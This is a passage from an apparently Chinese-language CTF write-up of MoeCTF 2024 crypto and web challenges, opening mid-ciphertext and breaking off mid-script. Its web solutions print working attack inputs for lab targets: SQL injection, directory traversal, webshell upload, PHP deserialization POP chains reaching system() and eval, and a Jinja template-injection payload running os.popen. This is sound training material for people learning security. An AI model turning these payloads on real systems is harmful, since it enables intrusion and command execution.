class="hljs-number">285912176726299387362893467150449209426</span>, <span class="hljs-number">120309832759140713296686339140142433386</span>, <span class="hljs-number">279125897926861811239250830750932241600</span>, <span class="hljs-number">289502053647872994218190050825294169535</span>, <span class="hljs-number">262459212837236162171047720358005836712</span>, <span class="hljs-number">290390838897912466575239533978002826151</span>, <span class="hljs-number">292988850197951752250595007039860868400</span>, <span class="hljs-number">34796135808311610468205608686622819504</span>, <span class="hljs-number">25206338413385638687826160218013868658</span>, <span class="hljs-number">42180804482932648992176529097078580055</span>, <span class="hljs-number">195897225052351816559125785179252565465</span>, <span class="hljs-number">290060760535408066224831756224248708027</span>, <span class="hljs-number">34243626514368402883316460494646065629</span>, <span class="hljs-number">159497726968729366867935528734367549832</span>, <span class="hljs-number">267785772871046662107247674801793846921</span>, <span class="hljs-number">47342328853090920958565777290912999560</span>, <span class="hljs-number">194980176549393239742230551297786993434</span>, <span class="hljs-number">88020247887557921707284362381274951852</span>, <span class="hljs-number">255474100333005567974457204812640809071</span>, <span class="hljs-number">93324791124684170744053910877870176609</span>, <span class="hljs-number">69542826141091170218040988642070014011</span>, <span class="hljs-number">188678529221313094426441439309063681864</span>, <span class="hljs-number">56030802691247887446204447769438570825</span>, <span class="hljs-number">74312207153349149422500961216106557393</span>, <span class="hljs-number">153811406554673020809393530896156460494</span>, <span class="hljs-number">130232956128662318657579623819323546361</span>, <span class="hljs-number">241587755919930468705435097001858194189</span>, <span class="hljs-number">150548598672513907492388638742866339038</span>, <span class="hljs-number">38780469811591978249139697733603217652</span>, <span class="hljs-number">237554030153815380781978075720171312418</span>, <span class="hljs-number">96541634878634946114738393982914693394</span>, <span class="hljs-number">83284071476491638125716901346418260661</span>, <span class="hljs-number">277535192833115492238855935055373371297</span>, <span class="hljs-number">92291115416977028401374199691398676627</span>, <span class="hljs-number">105634075531674200869064066234662065605</span>, <span class="hljs-number">59669321288506854711632528171527160495</span>, <span class="hljs-number">24913178886798791108798737682436779604</span>, <span class="hljs-number">191902245938756063865405758957515936934</span>, <span class="hljs-number">200833770402179506644143905670947994664</span>, <span class="hljs-number">249327029439265065126080906281744759655</span>, <span class="hljs-number">2368715218056973901783211260781833927</span>, <span class="hljs-number">133209645820509536502329231321782644514</span>, <span class="hljs-number">170083361139958757944996287868734988169</span>, <span class="hljs-number">143242266754832252556264383809361085258</span>, <span class="hljs-number">198438133508477313319510861550461456953</span>, <span class="hljs-number">226416574016152349355240811564666677855</span>, <span class="hljs-number">131995850810926550122710727062184985075</span>, <span class="hljs-number">206211971624338783828953817981719254101</span>, <span class="hljs-number">95022339713176475801874420969255633409</span>, <span class="hljs-number">39239785273544046574575511790952158726</span>, <span class="hljs-number">6761950061835300419279903725369635970</span>, <span class="hljs-number">160849355761964483498641169767552240859</span>, <span class="hljs-number">44129081383649229398785011378026849128</span>, <span class="hljs-number">116611486899507912253396257166983831123</span>, <span class="hljs-number">102748760887182142877957834312659347601</span>, <span class="hljs-number">100973668783270797012352094429175531207</span>, <span class="hljs-number">110548564207426762905750742091610942634</span>, <span class="hljs-number">205424582078496700107783237952155124442</span>, <span class="hljs-number">210932790939110827079725957948996247757</span>, <span class="hljs-number">54413304958149902897514912130730392489</span>, <span class="hljs-number">181315803651356180100745517014898850424</span>, <span class="hljs-number">183346938138867395962624263310328788228</span>, <span class="hljs-number">133507835720650939452036529283981720094</span>, <span class="hljs-number">244220649646693249242542702657146329679</span>, <span class="hljs-number">111814540087048948955999016117121133729</span>, <span class="hljs-number">210757262617434713384638061648414714521</span>, <span class="hljs-number">31712005436857719771604404352654183712</span>, <span class="hljs-number">299210790483067037892753875410776716305</span>, <span class="hljs-number">34216439939230284515095120240039231491</span>, <span class="hljs-number">246820219620854547856488049434101568744</span>, <span class="hljs-number">298588211282375015522910461809769779222</span>, <span class="hljs-number">53320103067319149790078933423751044737</span>, <span class="hljs-number">164977173816081040725650999609390274279</span>, <span class="hljs-number">234782977255751828939911143180631329578</span>, <span class="hljs-number">61521250269407451751766565186333346163</span>, <span class="hljs-number">119529895182262920689181379893081203421</span>, <span class="hljs-number">154588465395872896210615516764102943961</span>, <span class="hljs-number">153034255402211966905777978896125271527</span>, <span class="hljs-number">65497510688725487475002809757533544579</span>, <span class="hljs-number">76824114145168270682129892469858568031</span>, <span class="hljs-number">218064880554787781811938382300930885801</span>, <span class="hljs-number">196850060586188141836799779247809406205</span>, <span class="hljs-number">176023892018381269394229104598502170110</span>, <span class="hljs-number">32491776807255207889633110137157036238</span>, <span class="hljs-number">41150198830446315717651890670848632754</span>, <span class="hljs-number">260753023840843193587871227195221789744</span>, <span class="hljs-number">48345408122882987831052823644867513356</span>, <span class="hljs-number">80045935233531979816083287928071697883</span>, <span class="hljs-number">131878104259519592871955471048058374000</span>, <span class="hljs-number">15534379538690707223440448056318568055</span>, <span class="hljs-number">131291412522855581131329717355299310716</span>, <span class="hljs-number">37018675243998552749630837151597269431</span>, <span class="hljs-number">144343493968520204610097930388908478903</span>, <span class="hljs-number">67236444178494959708570043908346657722</span>, <span class="hljs-number">102574100831305499879105427279131095784</span>, <span class="hljs-number">249069309513964056714882166119752611668</span>, <span class="hljs-number">210718130986716991560768592011623825976</span>, <span class="hljs-number">266242407402824082344585571101593909650</span>, <span class="hljs-number">205203132247422842477137158586071965100</span>, <span class="hljs-number">301157372202750742637385626243753030679</span>, <span class="hljs-number">40886620741595313792996852647181029560</span>, <span class="hljs-number">253361171396328884567373946949359324229</span>, <span class="hljs-number">50071128101197582041162516700015376269</span>, <span class="hljs-number">106002417001877546867386840932652850816</span>, <span class="hljs-number">224086864980106045542532841236299648038</span>, <span class="hljs-number">42103921294151508500634063253613482845</span>, <span class="hljs-number">49777138159264482913170680298952908154</span>, <span class="hljs-number">24324534484842395819609478778764950811</span>, <span class="hljs-number">204106593629836179932302789646808274058</span>, <span class="hljs-number">266707066043760482642609614924857456238</span>, <span class="hljs-number">18723835069315957900598472598907945204</span>, <span class="hljs-number">244338819469013923747256697307964210342</span>, <span class="hljs-number">36296287172854997655950896217230267111</span>, <span class="hljs-number">292888671179451539882069138267865661448</span>, <span class="hljs-number">287111415651274690627399445990831389362</span>, <span class="hljs-number">79940439572496625318602146625920961720</span>, <span class="hljs-number">288270505176661814341807462681727466925</span>, <span class="hljs-number">153921178962139214138689743179633342125</span>, <span class="hljs-number">263564317934507756965522450042219801757</span>, <span class="hljs-number">197993323684501153884855839599466707355</span>, <span class="hljs-number">72143993205715719344183507132882267579</span>, <span class="hljs-number">67511075584002491895239101559049103979</span>, <span class="hljs-number">231396344630318648781207380069016790960</span>, <span class="hljs-number">268490084177254392405211695854127631350</span>, <span class="hljs-number">45968181401712207064942095991325993181</span>, <span class="hljs-number">34472329776995578971329318400545600788</span>, <span class="hljs-number">112967316661320871429337739209994987784</span>, <span class="hljs-number">209508577387521479468956337084132598710</span>, <span class="hljs-number">194445696189141465862938111222574992064</span>, <span class="hljs-number">229942079198360020568341753187100646148</span>, <span class="hljs-number">47944382795398541172186729027517882654</span>, <span class="hljs-number">54806201653083974379270761512143387910</span>, <span class="hljs-number">93457347627015900562505045196097224001</span>, <span class="hljs-number">152033139738914238723733340538181549419</span>, <span class="hljs-number">123719026823969669345162603978875451754</span>, <span class="hljs-number">154704533151410142607151617227929824563</span>, <span class="hljs-number">32428281285686815618553795197210513625</span>, <span class="hljs-number">265229864831280807254743597731258298440</span>, <span class="hljs-number">14904705423314872103792141735779112532</span>, <span class="hljs-number">177442398230615511669857060547212895616</span>, <span class="hljs-number">144918716871520627851549439448066637518</span>, <span class="hljs-number">203019416536984157536348865479415073573</span>, <span class="hljs-number">288452420706913930307744155709559750006</span>, <span class="hljs-number">282516471994395201735206793889605510595</span>, <span class="hljs-number">150722332251745138694381051866105655391</span>, <span class="hljs-number">234504581837296595003379465512031425988</span>, <span class="hljs-number">44178766618576668748878202507789103195</span>, <span class="hljs-number">217129489675072754441642067295058817201</span>, <span class="hljs-number">245087939287551829934600756568137757979</span>, <span class="hljs-number">240954534396950014938672406581264782638</span>]<br><br>decrypted_flag = decrypt_flag(ciphertext, p, a)<br><span class="hljs-built_in">print</span>(decrypted_flag)<br></code></pre></td></tr></table></figure><h1 id="web渗透测试与审计"><a class="markdownIt-Anchor" href="#web渗透测试与审计"></a> Web渗透测试与审计</h1><h2 id="web渗透测试与审计入门指北"><a class="markdownIt-Anchor" href="#web渗透测试与审计入门指北"></a> Web渗透测试与审计入门指北</h2><p>利用phpstudy进行搭建，得到flag</p><p><img src="/../../images/moectf/moectf2024/web%E5%85%A5%E9%97%A8.png" alt="web入门"></p><h2 id="弗拉格之地的入口"><a class="markdownIt-Anchor" href="#弗拉格之地的入口"></a> 弗拉格之地的入口</h2><p>进入题目，hint是爬虫，联想到robots.txt，打开得到<code>/webtutorEntry.php</code>,进入页面得到flag</p><p><strong>moectf{CONGr@Tu14TioN-foR-KNOwlNG-ROBOtS_txT10e7d}</strong></p><h2 id="ez_http"><a class="markdownIt-Anchor" href="#ez_http"></a> ez_http</h2><img src="../../images/moectf/moectf2024/ez_http1.png" alt="ez_http1" style="zoom:50%;"><p><img src="../../images/moectf/moectf2024/ez_http2.png" alt="ez_http2"></p><p><img src="../../images/moectf/moectf2024/ez_http3.png" alt="ez_http3"></p><p><img src="../../images/moectf/moectf2024/ez_http4.png" alt="ez_http4"></p><p><strong>moectf{y0u-4RE_ReA1lY-re@LlY_verY_c1EVEr!!!20ed}</strong></p><h2 id="垫刀之路01-moectf启动"><a class="markdownIt-Anchor" href="#垫刀之路01-moectf启动"></a> 垫刀之路01: MoeCTF？启动！</h2><p>正常流程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> / -&gt;<span class="hljs-built_in">cat</span> /flag <span class="hljs-comment">#提示在环境里 -&gt;输入env</span><br></code></pre></td></tr></table></figure><h2 id="垫刀之路02-普通的文件上传"><a class="markdownIt-Anchor" href="#垫刀之路02-普通的文件上传"></a> 垫刀之路02: 普通的文件上传</h2><p>提示和01一样应该也在env里</p><p>传个一句话木马，然后打开env即可</p><h2 id="垫刀之路03-这是一个图床"><a class="markdownIt-Anchor" href="#垫刀之路03-这是一个图床"></a> 垫刀之路03: 这是一个图床</h2><p>加了图片限制，写一个一句话，末尾改成jpg，抓包再把jpg改成php，执行system(‘env’);就行了</p><h2 id="垫刀之路04-一个文件浏览器"><a class="markdownIt-Anchor" href="#垫刀之路04-一个文件浏览器"></a> 垫刀之路04: 一个文件浏览器</h2><p>考察的知识点是目录遍历。简单的翻了一下不在目前的目录下通过<code>../</code>往上查找,(需要url编码),找到flag那一层，进去提示不在该文件下</p><p>根据moejail_lv1的提示猜测在tmp的目录下,里面有flag，得到答案。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?path=../../../..//tmp/flag<br></code></pre></td></tr></table></figure><h2 id="垫刀之路05-登陆网站"><a class="markdownIt-Anchor" href="#垫刀之路05-登陆网站"></a> 垫刀之路05: 登陆网站</h2><p>先想到是尝试爆破的，突然下面跳出以前sql注入的记录</p><p>试了一下就出来了，进行了简答的截取绕过</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">a&#x27; or 1=1 #<br></code></pre></td></tr></table></figure><h2 id="垫刀之路06-pop-base-mini-moe"><a class="markdownIt-Anchor" href="#垫刀之路06-pop-base-mini-moe"></a> 垫刀之路06: pop base mini moe</h2><p>直接上wp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$evil</span>=<span class="hljs-string">&#x27;cat /flag&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$b</span>= <span class="hljs-string">&#x27;system&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$exp</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();<br><span class="hljs-variable">$exp</span>-&gt;a = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">B</span>();<br><br><span class="hljs-variable">$serialized_data</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$exp</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;?data=&quot;</span>.<span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$serialized_data</span>) ;<br></code></pre></td></tr></table></figure><p>这里微调一下代码，<code>$a</code>前面的private需要改成public，要不然调用不了<code>$a</code>.</p><h2 id="垫刀之路07-泄漏的密码"><a class="markdownIt-Anchor" href="#垫刀之路07-泄漏的密码"></a> 垫刀之路07: 泄漏的密码</h2><p>考察的Flask，得到pin进入console里面</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">&gt;&gt;&gt;os.listdir()<br>[<span class="hljs-string">&#x27;__pycache__&#x27;</span>, <span class="hljs-string">&#x27;flag&#x27;</span>, <span class="hljs-string">&#x27;app.py&#x27;</span>, <span class="hljs-string">&#x27;getPIN.py&#x27;</span>, <span class="hljs-string">&#x27;static&#x27;</span>, <span class="hljs-string">&#x27;templates&#x27;</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f: <span class="hljs-built_in">print</span>(f.read().strip())<br>moectf&#123;DONT_usIng-fLasK_6y_DE6UG_MOd_aNd-le4k-YOuR_p1nb&#125;<br></code></pre></td></tr></table></figure><h2 id="静态网页"><a class="markdownIt-Anchor" href="#静态网页"></a> 静态网页</h2><p>这题需要抓包看回显，orz我之前一直在看前端</p><p>看/api/get/?id=1-53可以得到具体的php</p><p>进去是一个MD5绕过</p><p>原来想着自绕过的，但是没有办法</p><p>后来直接a=0a，b[0a]=md5(0a)即可绕过，思路没转过来</p><h2 id="whos-blog"><a class="markdownIt-Anchor" href="#whos-blog"></a> who’s blog?</h2><p>fenjing一把梭得到答案</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=&#123;&#123;cycler.next.__globals__.__builtins__.__import__(<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;env&#x27;</span>).<span class="hljs-built_in">read</span>()&#125;&#125;;<br></code></pre></td></tr></table></figure><h2 id="proveyourlove"><a class="markdownIt-Anchor" href="#proveyourlove"></a> ProveYourLove</h2><p>方法1：抓包，发包得到flag</p><p><img src="/../../images/moectf/moectf2024/love1.png" alt="love1"></p><p><img src="/../../images/moectf/moectf2024/love2.png" alt="love2"></p><p>方法2：不会第一种可以手动删cookie，慢慢按</p><p>方法3：我做的时候没想到发包，在对应前端检测的地方打断点控制台绕过了，不推荐</p><h2 id="弗拉格之地的挑战"><a class="markdownIt-Anchor" href="#弗拉格之地的挑战"></a> 弗拉格之地的挑战</h2><p>第0层：直接进/flag1ab.html</p><p>第一层：看源码得到提示和下一层</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--flag1: bW9lY3Rm--&gt;</span><br><span class="hljs-comment">&lt;!--下一步：/flag2hh.php--&gt;</span><br></code></pre></td></tr></table></figure><p>第二层：如图所示</p><p><img src="/../../images/moectf/moectf2024/%E6%8C%91%E6%88%98.png" alt="挑战"></p><table><thead><tr><th>flag2</th><th>e0FmdEV</th></tr></thead><tbody><tr><td>nextpage</td><td>/flag3cad.php</td></tr></tbody></table><p>第三层:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">a</span>=a<br><span class="hljs-attribute">b</span>=a<br>cookie:<span class="hljs-attribute">verify</span>=admin<br></code></pre></td></tr></table></figure><p><code>flag3: yX3RoMXN</code></p><p><code>/flag4bbc.php</code></p><p>第四层：</p><p>控制台手动触发打断点</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">var</span> <span class="hljs-keyword">event</span> = <span class="hljs-keyword">new</span> MouseEvent(<span class="hljs-string">&#x27;click&#x27;</span>, &#123;<br>    <span class="hljs-string">&#x27;view&#x27;</span>: window,<br>    <span class="hljs-string">&#x27;bubbles&#x27;</span>: <span class="hljs-literal">true</span>,<br>    <span class="hljs-string">&#x27;cancelable&#x27;</span>: <span class="hljs-literal">true</span><br>&#125;);<br><br><span class="hljs-keyword">var</span> button = document.getElementById(<span class="hljs-string">&quot;scope&quot;</span>).getElementsByTagName(<span class="hljs-string">&quot;button&quot;</span>)[<span class="hljs-number">0</span>];<br>button.id = <span class="hljs-number">9</span>; <span class="hljs-comment">// 首先将其ID设置为9</span><br>button.dispatchEvent(<span class="hljs-keyword">event</span>); <span class="hljs-comment">// 手动触发点击事件</span><br></code></pre></td></tr></table></figure><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode">fla<span class="hljs-name">g4</span>: fdFVUMHJ<br>前往：/fla<span class="hljs-name">g5</span>sxr.php<br></code></pre></td></tr></table></figure><p>第五层：</p><p>提示框输入相应的内容，控制台输入content=‘aaa’，对应内容打断点</p><p>flag5: fSV90aDF</p><p>第六层：?moe=FLAG</p><p>post:moe=1</p><p>flag6: rZV9VX2t</p><p>第七层：</p><p>what=system(‘cat /f*’);</p><p>得到flag：rbm93X1dlQn0=</p><p>最后七层的flag拼接base64得到答案</p><p>bW9lY3Rme0FmdEVyX3RoMXNfdFVUMHJfSV90aDFrZV9VX2trbm93X1dlQn0=</p><p><strong>moectf{AftEr_th1s_tUT0r_I_th1ke_U_kknow_WeB}</strong></p><h2 id="moe-pop"><a class="markdownIt-Anchor" href="#moe-pop"></a> moe pop</h2><p>先上源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">class000</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$payl0ad</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$what</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">check</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;payl0ad === <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;FAILED TO ATTACK&#x27;</span>);<br>        &#125;<br>        <span class="hljs-variable">$a</span> = <span class="hljs-variable language_">$this</span>-&gt;what;<br>        <span class="hljs-variable">$a</span>();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">class001</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$payl0ad</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a-&gt;payload = <span class="hljs-variable language_">$this</span>-&gt;payl0ad;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">class002</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$sec</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$b</span>(<span class="hljs-variable language_">$this</span>-&gt;sec);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dangerous</span>(<span class="hljs-params"><span class="hljs-variable">$whaattt</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$whaattt</span>-&gt;<span class="hljs-title function_ invoke__">evvval</span>(<span class="hljs-variable">$this</span>-&gt;sec);<br>    &#125;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">class003</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mystr</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">evvval</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$str</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;mystr;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>]);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>进行简单的代码审计，从后往前推</p><p>class003有eval函数可以进行利用,class002中调用dangerous函数可以利用拼接，想引用dangerous可以给class001的payl0ad进行赋值利用a来new一个class002,要使用invoke函数的话，可以看class000,首先令payl0ad=000,成功正常的，成功给what赋值new class001</p><p>大题的思路就是这样正推的话直接上payload，为了连接起来，部分内容需要修改成public</p><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$exp</span> = <span class="hljs-keyword">new</span> class000;<br><span class="hljs-variable">$exp</span>-&gt;what=<span class="hljs-keyword">new</span> class001;<br><span class="hljs-variable">$exp</span>-&gt;what-&gt;payl0ad=<span class="hljs-string">&#x27;dangerous&#x27;</span>;<br><span class="hljs-variable">$exp</span>-&gt;what-&gt;a=<span class="hljs-keyword">new</span> class002;<br><span class="hljs-variable">$exp1</span>=<span class="hljs-keyword">new</span> class003;<br><span class="hljs-variable">$exp1</span>-&gt;mystr=<span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<br><span class="hljs-variable">$exp</span>-&gt;what-&gt;a-&gt;sec = <span class="hljs-variable">$exp1</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$exp</span>));<br></code></pre></td></tr></table></figure><p>payl0ad和sec我都改成public了，最后可以在phpinfo里面找到flag,ctrl+f搜索moe</p><h2 id="勇闯铜人阵"><a class="markdownIt-Anchor" href="#勇闯铜人阵"></a> 勇闯铜人阵</h2><p>😋之前自己敲完一个代码之后就了解了一些基础了，晚上敲一会出来了，自己代码能力还是要练一下的,关键点可能就是session保持持续会话，我第一次尝试的时候没用到session，第二次是代码逻辑问题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><span class="hljs-keyword">import</span> re<br>url = <span class="hljs-string">&#x27;http://127.0.0.1:59353/&#x27;</span><br>session = requests.Session()<br>response = session.get(url)<br>post_data = &#123;<span class="hljs-string">&#x27;player&#x27;</span>: <span class="hljs-string">&quot;123&quot;</span>, <span class="hljs-string">&#x27;direct&#x27;</span>: <span class="hljs-string">&quot;弟子明白&quot;</span>&#125;<br>post_response = session.post(url, data=post_data)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_direction</span>(<span class="hljs-params">number</span>):<br>    directions = &#123;<br>        <span class="hljs-number">1</span>: <span class="hljs-string">&quot;北方&quot;</span>,<br>        <span class="hljs-number">2</span>: <span class="hljs-string">&quot;东北方&quot;</span>,<br>        <span class="hljs-number">3</span>: <span class="hljs-string">&quot;东方&quot;</span>,<br>        <span class="hljs-number">4</span>: <span class="hljs-string">&quot;东南方&quot;</span>,<br>        <span class="hljs-number">5</span>: <span class="hljs-string">&quot;南方&quot;</span>,<br>        <span class="hljs-number">6</span>: <span class="hljs-string">&quot;西南方&quot;</span>,<br>        <span class="hljs-number">7</span>: <span class="hljs-string">&quot;西方&quot;</span>,<br>        <span class="hljs-number">8</span>: <span class="hljs-string">&quot;西北方&quot;</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> directions.get(number, <span class="hljs-string">&quot;无效的方向&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract</span>(<span class="hljs-params">html_content</span>):<br>    tag = BeautifulSoup(html_content, <span class="hljs-string">&#x27;html.parser&#x27;</span>).find(<span class="hljs-string">&#x27;h1&#x27;</span>, <span 